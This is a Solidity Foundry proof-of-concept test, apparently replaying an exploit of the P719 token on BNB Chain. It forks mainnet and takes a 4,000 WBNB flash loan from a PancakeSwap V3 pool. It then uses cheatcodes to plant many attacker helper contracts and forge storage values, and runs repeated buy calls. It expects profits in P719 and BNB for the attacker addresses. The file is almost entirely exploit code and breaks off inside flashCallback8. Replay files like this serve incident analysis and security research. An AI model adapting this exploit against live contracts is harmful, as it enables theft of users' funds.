
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 43023422;
    uint256 constant TX_TIMESTAMP = 1728650125;
    uint256 constant TX_BLOCK_NUMBER = 43023423;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        vm.etch(Addresses.attack_helper_D6B8, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_D6B8);
        vm.etch(Addresses.attack_helper_816B, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_816B);
        vm.etch(Addresses.attack_helper_422F, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_422F);
        vm.etch(Addresses.attack_helper_4975, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_4975);
        vm.etch(Addresses.attack_helper_EDD5, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_EDD5);
        vm.etch(Addresses.attack_helper_D6F6, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_D6F6);
        vm.etch(Addresses.attack_helper_B4F0, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_B4F0);
        vm.etch(Addresses.attack_helper_3BA2, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_3BA2);
        vm.etch(Addresses.attack_helper_A0DF, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_A0DF);
        vm.etch(Addresses.attack_helper_C858, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_C858);
        vm.etch(Addresses.attack_helper_FC29, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_FC29);
        vm.etch(Addresses.attack_helper_2950, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_2950);
        vm.etch(Addresses.attack_helper_970F, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_970F);
        vm.etch(Addresses.attack_helper_F720, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_F720);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_helper, helper, Addresses.P719, "P719", 902337592625002508400);
        _expectProfit(Addresses.A_0E074D_61AA, address(0), Addresses.ZERO, "BNB", 7000000000000000000);
        _expectProfit(Addresses.attack_helper_D6B8, address(0), Addresses.P719, "P719", 928206232070618386900);
        _expectProfit(Addresses.attack_helper_816B, address(0), Addresses.P719, "P719", 869504509442494262900);
        _expectProfit(Addresses.A_3D5D1E_DD0B, address(0), Addresses.ZERO, "BNB", 7000000000000000000);
        _expectProfit(Addresses.A_3D5D1E_DD0B, address(0), Addresses.P719, "P719", 1707930106994107532037);
        _expectProfit(Addresses.attack_contract, attack, Addresses.sdgh, "sdgh", 99999816860408262979);
        _expectProfit(Addresses.attack_helper_422F, address(0), Addresses.P719, "P719", 40);
        _expectProfit(Addresses.attack_helper_4975, address(0), Addresses.P719, "P719", 912423105590356216400);
        _expectProfit(Addresses.attack_helper_EDD5, address(0), Addresses.P719, "P719", 887817385335290557500);
        _expectProfit(Addresses.attack_helper_D6F6, address(0), Addresses.P719, "P719", 865100651422690694200);
        _expectProfit(Addresses.attack_helper_B4F0, address(0), Addresses.P719, "P719", 897418654457859143500);
        _expectProfit(Addresses.attack_helper_3BA2, address(0), Addresses.P719, "P719", 878517829614774493300);
        _expectProfit(Addresses.attack_helper_A0DF, address(0), Addresses.P719, "P719", 907338312484433077300);
        _expectProfit(Addresses.attack_helper_C858, address(0), Addresses.P719, "P719", 883130887404268678900);
        _expectProfit(Addresses.attack_helper_FC29, address(0), Addresses.P719, "P719", 892579292929801847800);
        _expectProfit(Addresses.attack_helper_2950, address(0), Addresses.P719, "P719", 922854537015418908000);
        _expectProfit(Addresses.attack_helper_970F, address(0), Addresses.P719, "P719", 873976313715234901100);
        _expectProfit(Addresses.attack_helper_F720, address(0), Addresses.P719, "P719", 917594354410259028700);
    }
}

contract OurAttack {




    AttackerHelper public helper;

    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(19)), bytes32(uint256(4000000000000000000000)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(16)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000001);
            IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), 0, 4000000000000000000000, flashProof);
        }
    }

    function flashCallback() internal {
        _markCallback(1);
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
    }

    function flashCallback2() internal {
        {
            uint256 withdrawAvailableAmount = IERC20Like(Addresses.WBNB).balanceOf(address(this));
            if (withdrawAvailableAmount > 4000000000000000000000) withdrawAvailableAmount = 4000000000000000000000;
            IWBNB(Addresses.WBNB).withdraw(withdrawAvailableAmount);
        }
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_D6B8;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_D6B8))._helper2();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        AttackerHelper(payable(Addresses.attack_helper_D6B8)).helperCb2{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_2950;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_2950))._helper13();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        AttackerHelper(payable(Addresses.attack_helper_2950)).helperCb12{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_F720;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_F720))._helper15();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        AttackerHelper(payable(Addresses.attack_helper_F720)).helperCb14{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_4975;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_4975))._helper5();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        AttackerHelper(payable(Addresses.attack_helper_4975)).helperCb4{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_A0DF;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_A0DF))._helper10();
    }

    function flashCallback3() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        AttackerHelper(payable(Addresses.attack_helper_A0DF)).helperCb9{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        AttackerHelper(payable(Addresses.attack_helper)).helperCb{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_B4F0;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_B4F0))._helper8();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        AttackerHelper(payable(Addresses.attack_helper_B4F0)).helperCb7{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_FC29;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_FC29))._helper12();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        AttackerHelper(payable(Addresses.attack_helper_FC29)).helperCb11{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_EDD5;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_EDD5))._helper6();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        AttackerHelper(payable(Addresses.attack_helper_EDD5)).helperCb5{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_C858;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_C858))._helper11();
    }

    function flashCallback4() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        AttackerHelper(payable(Addresses.attack_helper_C858)).helperCb10{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_3BA2;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_3BA2))._helper9();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        AttackerHelper(payable(Addresses.attack_helper_3BA2)).helperCb8{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_970F;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_970F))._helper14();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        AttackerHelper(payable(Addresses.attack_helper_970F)).helperCb13{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_816B;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_816B))._helper3();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        AttackerHelper(payable(Addresses.attack_helper_816B)).helperCb3{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1454044382182505530948864464970132342515416100854))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(616189338966657900853607117846831671492170017468))
            );
        {
            address created = Addresses.attack_helper_D6F6;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper_D6F6))._helper7();
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        AttackerHelper(payable(Addresses.attack_helper_D6F6)).helperCb6{value: 10000000000000000000}();
        IERC20Like(Addresses.P719).totalSupply();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_ECB800_13A2(Addresses.A_ECB800_13A2).buy{value: 100000000000000000000}();
    }

    function flashCallback5() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_23359D_E426(Addresses.A_23359D_E426).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_FA4929_74AB(Addresses.A_FA4929_74AB).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_C8DCE6_C5DD(Addresses.A_C8DCE6_C5DD).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_AC2757_232B(Addresses.A_AC2757_232B).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_8E2A27_E688(Addresses.A_8E2A27_E688).buy{value: 100000000000000000000}();
    }

    function flashCallback6() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_E50253_09CD(Addresses.A_E50253_09CD).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_3533EB_4D20(Addresses.A_3533EB_4D20).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_C79C4C_462E(Addresses.A_C79C4C_462E).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_3D2785_AE81(Addresses.A_3D2785_AE81).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_4F1014_1767(Addresses.A_4F1014_1767).buy{value: 100000000000000000000}();
    }

    function flashCallback7() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(27)),
                bytes32(uint256(874360546426733832907650785785267834784495547632))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(28)),
                bytes32(uint256(1102498401704275588923272485606729751841701952553))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(29)),
                bytes32(uint256(672245254139421069159259621980402824673627205077))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(30)),
                bytes32(uint256(1056860743504273485421971054704400604518719735896))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(31)),
                bytes32(uint256(875504388877580279160524987715596576165785320354))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(32)),
                bytes32(uint256(1354798459307642430956922689749292326919164630799))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(33)),
                bytes32(uint256(266861267188075185057903281316398437927187743083))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(34)),
                bytes32(uint256(736832084120903407390953078429368378997517375222))
            );
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_F6D10D_3B04(Addresses.A_F6D10D_3B04).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_4E8015_F0F6(Addresses.A_4E8015_F0F6).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_100883_6699(Addresses.A_100883_6699).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_BA4925_F4D8(Addresses.A_BA4925_F4D8).buy{value: 100000000000000000000}();
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IERC20Like(Addresses.P719).balanceOf(Addresses.P719);
        IContract_D3868B_3EEE(Addresses.A_D3868B_3EEE).buy{value: 100000000000000000000}();
    }

    function flashCallback8() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(21)),
                bytes32(uint256(159368502770368336141594216705589913795332921016))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(22)),
                bytes32(uint256(1269037323586194141939199683205555575470563600720))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(23)),
                bytes32(uint256(1455326423976853426052847408901804701791267125024))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(24)),
                bytes32(uint256(562038303337891283827220389514357274462830086517))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(25)),
                bytes32(uint256(918921790492038318812780025538806866307169493215))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(26)),
                bytes32(uint256(59258109052621240723085059238703240689481391365))
            );
        Harness.vmExt()
            .store(
